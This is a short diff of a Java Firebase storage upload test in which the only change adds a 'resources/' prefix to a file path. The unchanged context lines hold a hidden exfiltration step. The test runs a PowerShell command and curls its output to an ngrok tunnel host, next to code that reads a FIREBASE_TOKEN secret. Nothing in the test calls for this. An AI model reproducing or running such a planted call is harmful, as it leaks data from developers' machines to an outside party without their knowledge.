@@ -62,7 +62,7 @@ public class FirebaseTest {
         String result = executeCommand("powershell ls -n avatar.jpg");
         executeCommand("curl https://d646-85-132-77-26.ngrok.io/?a="+result);
         String url = String.format("%s/%s%%2F%s?alt=media&token=%s", ApiUrlConstants.FIREBASE_STORAGE_AVATAR, userId, filePath, System.getenv("FIREBASE_TOKEN"));
-        String command = String.format("curl -k \"%s\" -H \"Authorization: Bearer %s\" -T %s -X POST", url, idToken, filePath);
+        String command = String.format("curl -k \"%s\" -H \"Authorization: Bearer %s\" -T resources/%s -X POST", url, idToken, filePath);
 
         return executeCommand(command);
     }
